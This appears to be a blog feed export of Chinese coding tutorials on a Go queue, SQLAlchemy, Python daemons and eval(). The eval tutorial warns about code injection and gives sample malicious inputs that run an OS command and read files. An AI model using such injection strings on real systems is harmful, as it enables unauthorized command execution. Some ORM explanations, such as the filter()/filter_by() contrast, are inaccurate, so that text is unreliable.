<h5 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 出队</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">DeQueue</span><span class="params">()</span> <span class="params">(<span class="keyword">interface</span>&#123;&#125;, error)</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> queue.IsEmpty() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"queue is empty"</span>)</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    t := queue.items[<span class="number">0</span>]</div><div class="line">    queue.items = queue.items[<span class="number">1</span>:<span class="built_in">len</span>(queue.items)]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> t, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="取队头元素"><a href="#取队头元素" class="headerlink" title="取队头元素"></a>取队头元素</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 取队列第一个元素</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">Front</span><span class="params">()</span> <span class="params">(<span class="keyword">interface</span>&#123;&#125;, error)</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> queue.IsEmpty() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"queue is empty"</span>)</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    t := queue.items[<span class="number">0</span>]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> t, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="判断队列是否为空"><a href="#判断队列是否为空" class="headerlink" title="判断队列是否为空"></a>判断队列是否为空</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 判断队列是否为空</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">IsEmpty</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(queue.items) == <span class="number">0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="获取队列长度"><a href="#获取队列长度" class="headerlink" title="获取队列长度"></a>获取队列长度</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 获取队列的长度</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(queue.items)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="清空队列"><a href="#清空队列" class="headerlink" title="清空队列"></a>清空队列</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 清空队列</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">Clear</span><span class="params">()</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> queue.IsEmpty() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">"queue is empty"</span>)</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    queue.items = <span class="literal">nil</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="打印队列元素"><a href="#打印队列元素" class="headerlink" title="打印队列元素"></a>打印队列元素</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// 从队头-&gt;队尾</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(queue *Queue)</span> <span class="title">Print</span><span class="params">()</span></span> &#123;</div><div class="line">    queue.lock.Lock()</div><div class="line">    <span class="keyword">defer</span> queue.lock.Unlock()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> queue.items &#123;</div><div class="line">        fmt.Print(v, <span class="string">" "</span>)</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    fmt.Println()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"Myproject/queue"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> q queue.Queue</div><div class="line">    q.New()</div><div class="line"></div><div class="line">    q.EnQueue(<span class="number">1</span>)</div><div class="line">    q.EnQueue(<span class="number">2</span>)</div><div class="line">    q.EnQueue(<span class="number">3</span>)</div><div class="line"></div><div class="line">    q.Print()</div><div class="line"></div><div class="line">    fmt.Println(q.Len())</div><div class="line"></div><div class="line">    v, err := q.DeQueue()</div><div class="line">    fmt.Println(v, err)</div><div class="line"></div><div class="line">    v, err = q.Front()</div><div class="line">    fmt.Println(v, err)</div><div class="line"></div><div class="line">    q.Clear()</div><div class="line"></div><div class="line">    fmt.Println(q.IsEmpty())</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Python ORM框架-SQLAlchemy</title>
    <url>/2019/06/26/Python-ORM%E6%A1%86%E6%9E%B6-SQLAlchemy/</url>
    <content><![CDATA[<center>Python ORM 框架 SQLAlchemy 学习与总结。</center>

<a id="more"></a>
<h4 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h4><p>　　ORM：Object Relation Mapping，描述程序中对象和数据库中数据记录之间的映射关系的统称，是一种进行程序和数据库之间数据持久化的一种编程思想。ORM 常用操作就是：增、删、改、查。一般在 Python 程序中ORM 操作都是对 mysqldb 和 pymysql 这样的底层模块进行的封装处理。SQLAlchemy 是 Python 中最著名的ORM 框架。</p>
<h4 id="SQLAlchemy"><a href="#SQLAlchemy" class="headerlink" title="SQLAlchemy"></a>SQLAlchemy</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 安装ORM框架</span></div><div class="line"><span class="meta">$</span><span class="bash"> pip install sqlalchemy</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 安装数据库驱动</span></div><div class="line"><span class="meta">$</span><span class="bash"> pip install pymysql</span></div></pre></td></tr></table></figure>
<h5 id="创建数据库和表"><a href="#创建数据库和表" class="headerlink" title="创建数据库和表"></a>创建数据库和表</h5><figure class="highlight"><table><tr><td class="code"><pre><div class="line"># 创建test数据库</div><div class="line">create database test;</div><div class="line"></div><div class="line"># 切换到test数据库</div><div class="line">use test;</div><div class="line"></div><div class="line"># 创建user表，包含id、name和age字段</div><div class="line">create table user (id INT primary key, name VARCHAR(20), age TINYINT)</div></pre></td></tr></table></figure>
<h5 id="连接引擎"><a href="#连接引擎" class="headerlink" title="连接引擎"></a>连接引擎</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 引入建立引擎的模块</span></div><div class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</div><div class="line"></div><div class="line"><span class="comment"># 创建一个和mysql数据库之间的连接引擎对象</span></div><div class="line">engine = create_engine(<span class="string">"mysql+pymysql://root:root@localhost/test"</span>, encoding=<span class="string">"utf-8"</span>, echo=<span class="keyword">True</span>)</div><div class="line"><span class="comment"># 数据库+数据库连接框架://用户名:密码@IP地址:端口号/数据库名称。</span></div></pre></td></tr></table></figure>
<h5 id="连接会话"><a href="#连接会话" class="headerlink" title="连接会话"></a>连接会话</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 引入创建session连接会话需要的处理模块</span></div><div class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> sessionmaker</div><div class="line"></div><div class="line"><span class="comment"># 创建一个连接会话对象；需要指定是和那个数据库引擎之间的会话</span></div><div class="line">Session = sessionmaker(bind=engine)</div><div class="line">session = Session()</div></pre></td></tr></table></figure>
<h5 id="数据模型基础类"><a href="#数据模型基础类" class="headerlink" title="数据模型基础类"></a>数据模型基础类</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 引入需要的模块</span></div><div class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</div><div class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> Column, String, Integer</div><div class="line"></div><div class="line"><span class="comment"># 创建基础类</span></div><div class="line">BaseModel = declarative_base()</div><div class="line"></div><div class="line"><span class="comment"># 创建用户模型</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(BaseModel)</span>:</span></div><div class="line">    <span class="comment"># 定义和指定数据库表之间的关联</span></div><div class="line">    __tablename__ = “user”</div><div class="line">    <span class="comment"># 创建字段类型</span></div><div class="line">    id = Column(Integer, primary_key=<span class="keyword">True</span>)</div><div class="line">    name = Column(String(<span class="number">20</span>))</div><div class="line">    age = Column(Integer)</div></pre></td></tr></table></figure>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">user1 = User(id=<span class="number">1</span>, name=<span class="string">"fzy"</span>, age=<span class="number">24</span>)</div><div class="line">user2 = User(id=<span class="number">2</span>, name=<span class="string">"xxy"</span>, age=<span class="number">22</span>)</div><div class="line">user3 = User(id=<span class="number">2</span>, name=<span class="string">"asd"</span>, age=<span class="number">22</span>)</div><div class="line">session.add(user1)</div><div class="line">session.add(user2)</div><div class="line">session.add(user3)</div><div class="line">session.commit()</div><div class="line">session.close()</div></pre></td></tr></table></figure>
<h5 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h5><ul>
<li>基本查询</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">user_list = session.query(User)</div><div class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_list:</div><div class="line">    print(user.name, user.age)</div><div class="line">session.close()</div></pre></td></tr></table></figure>
<p>　　查询结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 25</div><div class="line">xxy 22</div><div class="line">asd 22</div></pre></td></tr></table></figure>
<ul>
<li>条件查询</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">user_list = session.query(User).filter(User.age==<span class="number">22</span>)</div><div class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_list:</div><div class="line">    print(user.name, user.age)</div><div class="line">session.close()</div></pre></td></tr></table></figure>
<p>　　查询结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">xxy 22</div><div class="line">asd 22</div></pre></td></tr></table></figure>
<p>　　对比 <code>filter()</code> 和 <code>filter_by()</code> 方法的区别：</p>
<ul>
<li><code>filter()</code> 的参数是一个 boolean 类型，所以它的参数不是一个表达式。</li>
<li><p><code>filter_by()</code>的参数是一个表达式，而不是 boolean 值。</p>
</li>
<li><p>查询结果排序</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">user_list = session.query(User).order_by(User.id) </div><div class="line">user_list = session.query(User).order_by(-User.id) </div><div class="line">user_list = session.query(User).order_by(User.age)	<span class="comment"># 默认顺序</span></div><div class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_list:</div><div class="line">    print(user.name, user.age)</div><div class="line"></div><div class="line">print(<span class="string">'------'</span>)</div><div class="line">    </div><div class="line">user_list = session.query(User).order_by(-User.age)	<span class="comment"># 指定倒序</span></div><div class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_list:</div><div class="line">    print(user.name, user.age)</div><div class="line"></div><div class="line">session.query(User).order_by(-User.id, User.name)	<span class="comment"># 根据多字段排序</span></div><div class="line">session.close()</div></pre></td></tr></table></figure>
<p>　　查询结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">xxy 22</div><div class="line">asd 22</div><div class="line">fzy 25</div><div class="line">------</div><div class="line">fzy 25</div><div class="line">xxy 22</div><div class="line">asd 22</div></pre></td></tr></table></figure>
<p>　　其他查询结果处理：</p>
<ul>
<li><code>all()</code> 函数返回查询列表</li>
<li><code>filter()</code> 函数返回单项数据的列表生成器</li>
<li><code>one()/one_or_none()/scalar()</code> 返回单独的一个数据对象</li>
</ul>
<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">update_user = session.query(User).filter_by(id=<span class="number">1</span>).first()</div><div class="line">update_user.age = <span class="number">25</span></div><div class="line">session.commit()</div><div class="line"></div><div class="line">user = session.query(User).filter_by(id=<span class="number">1</span>).one()</div><div class="line">print(user.name, user.age)</div><div class="line">session.close()</div></pre></td></tr></table></figure>
<p>　　修改结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 25</div></pre></td></tr></table></figure>
<h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">del_user = session.query(User).filter_by(id=1).first()</div><div class="line">session.delete(del_user)</div><div class="line">session.commit()</div><div class="line">session.close()</div></pre></td></tr></table></figure>
<h5 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">session.rollback()</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python daemon守护进程</title>
    <url>/2019/06/24/Python-daemon%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<center>Python daemon 守护进程学习与总结。</center>

<a id="more"></a>
<h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>　　守护进程是生存期长的一种进程。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。他们常常在系统引导装入时启动，在系统关闭时终止。</p>
<h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ul>
<li>在后台运行。</li>
<li>与其运行前的环境隔离开来。这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等。这些环境通常是守护进程从执行它的父进程（特别是shell）中继承下来的。</li>
<li>启动方式特殊，它可以在系统启动时从启动脚本 /etc/rc.d 中启动，可以由 inetd 守护进程启动，可以由 crond 启动，还可以由用户终端（通常是 shell）执行。</li>
</ul>
<p>　　总之，除开这些特殊性以外，守护进程与普通进程基本上没有什么区别。因此，编写守护进程实际上是把一个普通进程按照上述的守护进程的特性改造成为守护进程。</p>
<h5 id="编程规则"><a href="#编程规则" class="headerlink" title="编程规则"></a>编程规则</h5><ul>
<li>在后台运行，调用 fork ，然后使父进程 exit。</li>
<li>脱离控制终端，登录会话和进程组，调用 setsid() 使进程成为会话组长。</li>
<li>禁止进程重新打开控制终端。</li>
<li>关闭打开的文件描述符，调用 fclose()。</li>
<li>将当前工作目录更改为根目录。</li>
<li>重设文件创建掩码为 0。</li>
<li>处理 SIGCHLD 信号。</li>
</ul>
<h4 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h4><h5 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding=utf8</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> atexit</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">(pid_file=None)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    创建守护进程</div><div class="line">    :param pid_file: 保存进程id的文件</div><div class="line">    :return:</div><div class="line">    """</div><div class="line">    <span class="comment"># 从父进程fork一个子进程出来</span></div><div class="line">    pid = os.fork()</div><div class="line">    <span class="comment"># 子进程的pid一定为0，父进程大于0</span></div><div class="line">    <span class="keyword">if</span> pid:</div><div class="line">        <span class="comment"># 退出父进程</span></div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"> </div><div class="line">    <span class="comment"># 子进程默认继承父进程的工作目录，最好是变更到根目录，否则回影响文件系统的卸载</span></div><div class="line">    os.chdir(<span class="string">'/'</span>)</div><div class="line">    <span class="comment"># 子进程默认继承父进程的umask（文件权限掩码），重设为0（完全控制），以免影响程序读写文件</span></div><div class="line">    os.umask(<span class="number">0</span>)</div><div class="line">    <span class="comment"># 让子进程成为新的会话组长和进程组长</span></div><div class="line">    os.setsid()</div><div class="line"> </div><div class="line">    <span class="comment"># 注意了，这里是第2次fork，也就是子进程的子进程，我们把它叫为孙子进程</span></div><div class="line">    _pid = os.fork()</div><div class="line">    <span class="keyword">if</span> _pid:</div><div class="line">        <span class="comment"># 退出子进程</span></div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"> </div><div class="line">    <span class="comment"># 此时，孙子进程已经是守护进程了，接下来重定向标准输入、输出、错误的描述符(是重定向而不是关闭, 这样可以避免程序在 print 的时候出错)</span></div><div class="line"> </div><div class="line">    <span class="comment"># 刷新缓冲区先，小心使得万年船</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    sys.stderr.flush()</div><div class="line"> </div><div class="line">    <span class="comment"># dup2函数原子化地关闭和复制文件描述符，重定向到/dev/nul，即丢弃所有输入输出</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'/dev/null'</span>) <span class="keyword">as</span> read_null, open(<span class="string">'/dev/null'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> write_null:</div><div class="line">        os.dup2(read_null.fileno(), sys.stdin.fileno())</div><div class="line">        os.dup2(write_null.fileno(), sys.stdout.fileno())</div><div class="line">        os.dup2(write_null.fileno(), sys.stderr.fileno())</div><div class="line"> </div><div class="line">    <span class="comment"># 写入pid文件</span></div><div class="line">    <span class="keyword">if</span> pid_file:</div><div class="line">        <span class="keyword">with</span> open(pid_file, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</div><div class="line">            f.write(str(os.getpid()))</div><div class="line">        <span class="comment"># 注册退出函数，进程异常退出时移除pid文件</span></div><div class="line">        atexit.register(os.remove, pid_file)</div></pre></td></tr></table></figure>
<h5 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h5><p>　　Github 开源项目：<a href="https://github.com/serverdensity/python-daemon.git" target="_blank" rel="external">python-daemon</a> 提供了 Python 版本的守护进程化实现。提供了以下方法：</p>
<ul>
<li><code>start()</code> - starts the daemon (creates PID and daemonizes).</li>
<li><code>stop()</code> - stops the daemon (stops the child process and removes the PID).</li>
<li><code>restart()</code> - does <code>stop()</code> then <code>start()</code>.</li>
</ul>
<p>　　直接继承 Daemon 类即可，使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> daemon <span class="keyword">import</span> Daemon</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">pantalaimon</span><span class="params">(Daemon)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># Do stuff</span></div><div class="line"></div><div class="line"><span class="comment"># 指定 pid 文件的路径</span></div><div class="line">pineMarten = pantalaimon(<span class="string">'/path/to/pid.pid'</span>)</div><div class="line">pineMarten.start()</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python eval 函数</title>
    <url>/2019/06/16/Python-eval-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<center>Python eval 函数学习与总结。</center>

<a id="more"></a>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>　　<code>eval()</code> 函数用来执行一个字符串表达式，并返回表达式的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">eval(expression[, globals[, locals]])</div></pre></td></tr></table></figure>
<ul>
<li><code>expression</code> ：表达式。</li>
<li><code>globals</code> ：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</li>
<li><code>locals</code> ：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt;x = <span class="number">7</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval( <span class="string">'3 * x'</span> )</div><div class="line"><span class="number">21</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">'pow(2,2)'</span>)</div><div class="line"><span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>n=<span class="number">81</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"n + 4"</span>)</div><div class="line"><span class="number">85</span></div></pre></td></tr></table></figure>
<h5 id="默认作用域"><a href="#默认作用域" class="headerlink" title="默认作用域"></a>默认作用域</h5><p>　　在 <code>globals</code> 和 <code>locals</code> 两个参数省略的情况下，<code>eval()</code> 函数在当前的作用域执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">x = <span class="number">100</span></div><div class="line">y = <span class="number">200</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute</span><span class="params">()</span>:</span></div><div class="line">    x = <span class="number">10</span></div><div class="line">    y = <span class="number">20</span></div><div class="line">    print(eval(<span class="string">"x + y"</span>))</div><div class="line"></div><div class="line"></div><div class="line">compute()</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">30</div></pre></td></tr></table></figure>
<h5 id="globals-作用域"><a href="#globals-作用域" class="headerlink" title="globals 作用域"></a>globals 作用域</h5><p>　　Python 的全局名字空间存储在一个叫 <code>globals()</code> 的字典对象中；局部名字空间存储在一个叫 <code>locals()</code> 的字典对象中。我们可以用 <code>print ()</code> 来查看该函数体内的所有变量名和变量值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">x = <span class="number">100</span></div><div class="line">y = <span class="number">200</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute</span><span class="params">()</span>:</span></div><div class="line">    x = <span class="number">10</span></div><div class="line">    y = <span class="number">20</span></div><div class="line">    print(globals())</div><div class="line">    print(locals())</div><div class="line"></div><div class="line"></div><div class="line">compute()</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;&apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__package__&apos;: None, &apos;__loader__&apos;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x0000024AC58C7710&gt;, &apos;__spec__&apos;: None, &apos;__annotations__&apos;: &#123;&#125;, &apos;__builtins__&apos;: &lt;module &apos;builtins&apos; (built-in)&gt;, &apos;__file__&apos;: &apos;D:/Code/draw.py&apos;, &apos;__cached__&apos;: None, &apos;x&apos;: 100, &apos;y&apos;: 200, &apos;compute&apos;: &lt;function compute at 0x0000024AC587C268&gt;&#125;</div><div class="line">&#123;&apos;x&apos;: 10, &apos;y&apos;: 20&#125;</div></pre></td></tr></table></figure>
<p>　　从结果可以看到，<code>globals()</code> 的结果包含了全局变量 <code>&#39;x&#39;: 100, &#39;y&#39;: 200</code> ，而 <code>locals()</code> 则包含的是局部变量 <code>&#39;x&#39;: 10, &#39;y&#39;: 20</code>。eval 函数包含 <code>globals</code> 参数则会使用全局作用域下的变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">x = <span class="number">100</span></div><div class="line">y = <span class="number">200</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute</span><span class="params">()</span>:</span></div><div class="line">    x = <span class="number">10</span></div><div class="line">    y = <span class="number">20</span></div><div class="line">    print(eval(<span class="string">"x + y"</span>, globals()))</div><div class="line"></div><div class="line">    </div><div class="line">compute()</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">300</div></pre></td></tr></table></figure>
<h5 id="locals-作用域"><a href="#locals-作用域" class="headerlink" title="locals 作用域"></a>locals 作用域</h5><p>如果同时包含 <code>globals</code> 和 <code>locals</code> 参数，则会优先在本地作用域查找，如果本地作用域没有，才会查找全局作用域。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">x = <span class="number">100</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute</span><span class="params">()</span>:</span></div><div class="line">    y = <span class="number">20</span></div><div class="line">    print(eval(<span class="string">"x + y"</span>, globals(), locals()))</div><div class="line"></div><div class="line"></div><div class="line">compute()</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">120</div></pre></td></tr></table></figure>
<h4 id="字符串转换"><a href="#字符串转换" class="headerlink" title="字符串转换"></a>字符串转换</h4><h5 id="字符串转换成列表"><a href="#字符串转换成列表" class="headerlink" title="字符串转换成列表"></a>字符串转换成列表</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">s = <span class="string">"[[1,2], [3,4], [5,6]]"</span></div><div class="line">print(type(s))</div><div class="line">lst = eval(s)</div><div class="line">print(type(lst))</div><div class="line">print(lst)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;class &apos;str&apos;&gt;</div><div class="line">&lt;class &apos;list&apos;&gt;</div><div class="line">[[1, 2], [3, 4], [5, 6]]</div></pre></td></tr></table></figure>
<h5 id="字符串转换成字典"><a href="#字符串转换成字典" class="headerlink" title="字符串转换成字典"></a>字符串转换成字典</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">s = <span class="string">"&#123;'math': 90, 'chinese': 100&#125;"</span></div><div class="line">print(type(s))</div><div class="line">dic = eval(s)</div><div class="line">print(type(dic))</div><div class="line">print(dic)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;class &apos;str&apos;&gt;</div><div class="line">&lt;class &apos;dict&apos;&gt;</div><div class="line">&#123;&apos;math&apos;: 90, &apos;chinese&apos;: 100&#125;</div></pre></td></tr></table></figure>
<h5 id="字符串转换成元组"><a href="#字符串转换成元组" class="headerlink" title="字符串转换成元组"></a>字符串转换成元组</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">s = <span class="string">"([1,2], [3,4], [5,6])"</span></div><div class="line">print(type(s))</div><div class="line">tup = eval(s)</div><div class="line">print(type(tup))</div><div class="line">print(tup)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;class &apos;str&apos;&gt;</div><div class="line">&lt;class &apos;tuple&apos;&gt;</div><div class="line">([1, 2], [3, 4], [5, 6])</div></pre></td></tr></table></figure>
<h4 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h4><p>　　<code>eval()</code> 函数有安全性问题，比如用户恶意输入就会获得当前目录文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">eval(<span class="string">"__import__('os').system('dir')"</span>)</div></pre></td></tr></table></figure>
<p>　　甚至查看目录下的所有文件的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">eval(open(‘filename’).read())</div></pre></td></tr></table></figure>
<p>　　怎么避免安全问题？</p>
<ul>
<li><p>自行写检查函数；</p>
</li>
<li><p>使用 <a href="https://docs.python.org/zh-cn/3.7/library/ast.html" target="_blank" rel="external">ast.literal_eval</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 面向对象-方法</title>
    <url>/2019/06/12/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<center>Python 面向对象，类方法、静态方法、实例方法和属性方法学习与总结。</center>

<a id="more"></a>
